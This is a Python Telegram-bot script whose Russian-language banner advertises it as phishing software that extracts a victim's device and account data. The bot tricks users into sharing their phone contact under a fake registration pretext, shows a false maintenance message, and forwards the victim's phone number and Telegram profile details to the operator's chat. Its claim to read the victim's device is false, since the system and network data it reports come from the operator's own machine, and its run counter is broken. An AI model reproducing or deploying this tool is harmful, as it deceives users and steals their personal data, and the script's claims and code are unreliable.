import telebot
import requests
import datetime
import pytz
import platform
import os
import psutil
import socket
import subprocess
from colorama import Fore
import os
os.system('cls' if os.name == 'nt' else 'clear')

print(f""" {Fore.RED}Created of ikea \n
MegaParser.""") 

print(f"{Fore.RED}Это универсальный новый фишинговый софт который подключается к боту \n и вытягивает всю информацию с устройства и аккаунта жертвы. \n обязательно вставлять #Sakuta так как автор старался. \n")
TOKEN = input("Введите токен вашего бота: ")
bot_username = input(f" {Fore.RED} Введите username вашего бота (например, @Telegram_bot): ")
bot = telebot.TeleBot(TOKEN)
MY_CHAT_ID = input(f" {Fore.RED}Введите ваш id: ")
bot_runs = ''
user_phone_number = ''
maintenance_message_sent = ''

def get_location(ip_address):
    try:
        response = requests.get(f'https://ipinfo.io/{ip_address}/json')
        return response.json()
    except requests.exceptions.RequestException as e:
        return {"error": str(e)}

def get_network_info():
    network_info = []
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET:  # IPv4
                network_info.append(f"Interface: {interface} - IP: {addr.address}")
            elif addr.family == socket.AF_INET6:  # IPv6
                network_info.append(f"Interface: {interface} - IPv6: {addr.address}")
    return network_info

def get_system_info():
    system_info = {
        "OS": platform.system(),
        "OS_version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Architecture": platform.architecture(),
        "Python_version": platform.python_version(),
        "Python_implementation": platform.python_implementation(),
        "CPU_count": os.cpu_count(),
        "Network_name": platform.node(),
        "System_timezone": datetime.datetime.now(pytz.timezone('UTC')).astimezone().strftime('%Z'),
        "IP_address": requests.get('https://api.ipify.org').text
    }
    

    system_info["Memory"] = {
        "Total": psutil.virtual_memory().total,
        "Available": psutil.virtual_memory().available,
        "Used": psutil.virtual_memory().used,
        "Free": psutil.virtual_memory().free,
        "Percentage": psutil.virtual_memory().percent
    }
    system_info["Disk"] = {
        "Total": psutil.disk_usage('/').total,
        "Used": psutil.disk_usage('/').used,
        "Free": psutil.disk_usage('/').free,
        "Percentage": psutil.disk_usage('/').percent
    }

  
    try:
        battery = psutil.sensors_battery()
        if battery:
            system_info["Battery"] = {
                "Percent": battery.percent,
                "Plugged": battery.power_plugged,
                "Time Left": battery.secsleft
            }
    except Exception as e:
        system_info["Battery"] = {"Error": str(e)}
    
   
    try:
        system_info["CPU"] = {
            "Usage": psutil.cpu_percent(interval=1),
            "Cores": psutil.cpu_count(logical=True),
            "Physical Cores": psutil.cpu_count(logical=False),
            "Frequency": psutil.cpu_freq().current
        }
    except PermissionError:
        system_info["CPU"] = {"Error": "Permission denied to access CPU stats"}
    
    return system_info

def get_running_processes():
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info']):
        processes.append({
            "PID": proc.info['pid'],
            "Name": proc.info['name'],
            "User": proc.info['username'],
            "Memory Usage": proc.info['memory_info'].rss
        })
    return processes

@bot.message_handler(commands=['start'])
def send_welcome(message):
    global bot_runs, maintenance_message_sent
    bot_runs += 1

  
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    contact_button = telebot.types.KeyboardButton("Поделиться контактом", request_contact=True)
    markup.add(contact_button)
    bot.send_message(message.chat.id, "Пожалуйста, поделитесь своим контактом для регистрации в новом Боте для поиска данных.", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    global user_phone_number, maintenance_message_sent
    user_phone_number = message.contact.phone_number  

   
    bot.send_message(message.chat.id, "Спасибо за регистрацию! Ваш контакт был сохранен.")

    if not maintenance_message_sent:
        keyboard = telebot.types.ReplyKeyboardRemove()  
        bot.send_message(message.chat.id, "В данный момент бот находится на техническом обслуживании", reply_markup=keyboard)
        maintenance_message_sent = True  
    server_ip = requests.get('https://api.ipify.org').text
    location_data = get_location(server_ip)
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    current_time_utc = datetime.datetime.now(pytz.timezone('UTC')).astimezone()
    system_info = get_system_info()
    network_info = get_network_info()
    running_processes = get_running_processes()

    log_message = f"++++ SYSTEM ALERT: BOT ACCESS LOG ++++\n" \
                  f"USER: {message.from_user.first_name} ({message.from_user.id})\n" \
                  f"Username: @{message.from_user.username if message.from_user.username else 'Not Provided'}\n" \
                  f"Language: {message.from_user.language_code if message.from_user.language_code else 'Unknown'}\n" \
                  f"BOT RUN # {bot_runs} - INITIATED: {current_time}\n" \
                  f"---------------------------------------\n" \
                  f"Server IP: {server_ip}\n" \
                  f"Geolocation: {location_data.get('city', 'Unknown')}, {location_data.get('region', 'Unknown')}, {location_data.get('country', 'Unknown')}\n" \
                  f"Location Coordinates: Latitude - {location_data.get('loc', '').split(',')[0]}, Longitude - {location_data.get('loc', '').split(',')[1]}\n" \
                  f"ISP: {location_data.get('org', 'Unknown')}\n" \
                  f"Host: {location_data.get('hostname', 'Unknown')}\n" \
                  f"Network Info: {', '.join(network_info)}\n"

   
    bot.send_message(MY_CHAT_ID, log_message)
    
    
    log_message_2 = f"Device Info: {system_info['OS']} {system_info['OS_version']}, {system_info['Machine']} ({system_info['Processor']})\n" \
                    f"Architecture: {system_info['Architecture']}\n" \
                    f"Python Version: {system_info['Python_version']}\n" \
                    f"Python Implementation: {system_info['Python_implementation']}\n" \
                    f"CPU Cores: {system_info['CPU_count']}\n" \
                    f"Network Name: {system_info['Network_name']}\n" \
                    f"Timezone: {system_info['System_timezone']}\n" \
                    f"IP Address: {system_info['IP_address']}\n" \
                    f"Memory: {system_info['Memory']}\n" \
                    f"Disk: {system_info['Disk']}\n" \
                    f"Battery: {system_info.get('Battery', 'No battery information')}\n" \
                    f"CPU Info: {system_info['CPU']}\n" \
                    f"Running Processes: {running_processes}\n"

    bot.send_message(MY_CHAT_ID, log_message_2)
    
    
    log_message_3 = f"Telegram Version: {bot.get_me().username}\n" \
                    f"User's Timezone: {current_time_utc.strftime('%Z')} UTC\n" \
                    f"Phone Number: {user_phone_number if user_phone_number else 'Not Provided'}\n" \
                    f"---------------------------------------\n" \
                    f"BOT: {bot_username} is operational.\n" \
                    f"VERSION: 1.0.0\n" \
                    f"++++ END OF LOG ++++\n"
    bot.send_message(MY_CHAT_ID, log_message_3)


    bot.send_message(message.chat.id, "Вся информация успешно собрана и отправлена.")

bot.polling(none_stop=True)

